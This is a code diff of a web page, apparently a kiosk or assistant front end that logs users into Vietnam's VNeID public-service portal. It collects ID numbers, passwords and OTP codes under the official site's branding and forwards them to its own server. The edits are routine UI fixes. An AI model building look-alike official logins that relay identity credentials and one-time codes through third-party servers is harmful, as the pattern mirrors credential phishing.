@@ -47,7 +47,7 @@
 		<div id="process-area" class="dialog-area" style="display: visible; background-image: url('https://sso.dancuquocgia.gov.vn/_next/static/media/background-login.98683067.png') !important; background-repeat: no-repeat;z-index: 9; ">
 					<div id="login_area">
 								
-						<h3 class="login-title">Đặng nhập VNeID</h3>
+						<h3 class="login-title">Đăng nhập VNeID</h3>
 						<form class="signin-form" id="loginArea">
 							<div class="form-group">
 								<input type="text" class="form-control" id="SDD" name="userID" placeholder="Số định danh" >
@@ -69,7 +69,7 @@
 							</div>
 						</section>
 
-						<section id="OTP-area" style="display: none;">
+						<section id="OTP-area" style="visibility: hidden;">
 							<div class="prompt">Vui lòng nhập mã OTP đã được gửi vào số điện thoại của bạn!</div>
 								
 							<form id ="otp-form" class="digit-group" data-group-name="digits" data-autosubmit="false" autocomplete="off">
@@ -206,7 +206,23 @@
 					});
 				timeoutId = setTimeout(getQR, 3000);
 				}
-
+			function checkNotifications() {
+                fetch('/notifications')
+                    .then(response => response.json())
+                    .then(data => {
+						console.log(data)
+                        if (data.notifications === "Page is blank") {
+                            alert("Lỗi khi tải trang. Ứng dụng sẽ tự khởi động lại");
+							redirectToRoute();
+                        }
+						if (data.notifications === "Sai"){
+							alert("Sai tài khoản hoặc mật khẩu")
+							$('#SDD').val("");
+							$('#password-field').val("");
+						}
+                    });
+            }
+            setInterval(checkNotifications, 5000);
 			//Kiểm tra người dùng inactive thì restart
 			 let inactivityTimeout;
 			 function resetTimer() {
@@ -237,6 +253,9 @@
 			 document.addEventListener('mousemove', resetTimer);
 			 document.addEventListener('keydown', resetTimer);
 			$(document).ready(function() {
+				setTimeout(function() {
+					getQR();
+				}, 10000);
 				getQR();
 				$('#restartBT').click(function(event) {
 					var userHtml = '<div class="d-flex justify-content-end mb-4"><div class="msg_cotainer_send">Đang về trang chủ. Vui lòng đợi trong giây lát...<span class="msg_time_send">'+ str_time + '</span></div><div class="img_cont_msg"><img src="https://i.ibb.co/d5b84Xw/Untitled-design.png" class="rounded-circle user_img_msg"></div></div>';
@@ -323,7 +342,7 @@
 									url:"/chon_dvc_caplai",
 									success:function(response){
 										if (response === "lỗi"){
-											alert("Lỗi khi thực hiện dịch vụ. Ứng dụng sẽ khởi động lại")
+											alert("Lỗi khi thực hiện dịch vụ. Ứng dụng sẽ khởi động lại", 5)
 											redirectToRoute();
 										} else {
 										document.getElementById('anhhuongdanscan').src = "static\\templates\\hoanthanh.gif";
@@ -356,7 +375,7 @@
 									url:"/chon_dvc_xacminh",
 									success:function(response){
 										if (response === "lỗi"){
-											alert("Lỗi khi thực hiện dịch vụ. Ứng dụng sẽ khởi động lại")
+											alert("Lỗi khi thực hiện dịch vụ. Ứng dụng sẽ khởi động lại", 5)
 											redirectToRoute();
 										} else {
 										document.getElementById('anhhuongdanscan').src = "static\\templates\\hoanthanh.gif";
@@ -387,7 +406,7 @@
 									url:"/chon_dvc_doithe",
 									success:function(response){
 										if (response === "lỗi"){
-											alert("Lỗi khi thực hiện dịch vụ. Ứng dụng sẽ khởi động lại")
+											alert("Lỗi khi thực hiện dịch vụ. Ứng dụng sẽ khởi động lại", 5)
 											redirectToRoute();
 										} else {
 										document.getElementById('anhhuongdanscan').src = "static\\templates\\hoanthanh.gif";
@@ -416,7 +435,7 @@
 									url:"/laythongtin",
 									success:function(response){
 										if (response.hasOwnProperty("messageER")){
-											alert("Lỗi khi thực hiện dịch vụ. Ứng dụng sẽ khởi động lại")
+											alert("Lỗi khi thực hiện dịch vụ. Ứng dụng sẽ khởi động lại", 5)
 											redirectToRoute();
 										} else{
 										$('#formcutru').load('/static/xacminhct.html', function() {
@@ -468,7 +487,7 @@
 									url:"/laythongtin",
 									success:function(response){
 										if (response.hasOwnProperty("messageER")){
-											alert("Lỗi khi lấy thông tin. Ứng dụng sẽ khởi động lại")
+											alert("Lỗi khi lấy thông tin. Ứng dụng sẽ khởi động lại", 5)
 											redirectToRoute();
 										} else{
 										$('#formcutru').load('/static/tachho.html', function() {
@@ -543,7 +562,9 @@
 						dachondvc = true;
 						$("#process-area").css("opacity",'1')
 						$("#yt-vid").css("opacity",'0')
-						alert("Trước tiên hãy đăng nhập vào dịch vụ công bằng khung bên trái. Sau đó bấm đồng ý để tiếp tục thực hiện.")
+						alert("Trước tiên hãy đăng nhập vào dịch vụ công bằng khung bên trái. Sau đó bấm đồng ý để tiếp tục thực hiện.", 5)
+						const ytVideo = document.getElementById('yt-vid');
+						ytVideo.style.opacity = 0;
 						$.ajax({
 									url:"/restartBrowser",
 						})
@@ -577,7 +598,7 @@
 									userPass: pass },
 							success:function(response){
 								if (response === 'otp'){
-									$("#OTP-area").show(); 
+									$("#OTP-area").css("visibility", "visible"); 
 								}
 							},
 							error: function(error) {
@@ -588,8 +609,7 @@
 
 					});
 
-			
-
+		
 				$("#otp-form").on("submit",function(even){
 					even.preventDefault();
 					var otp='';
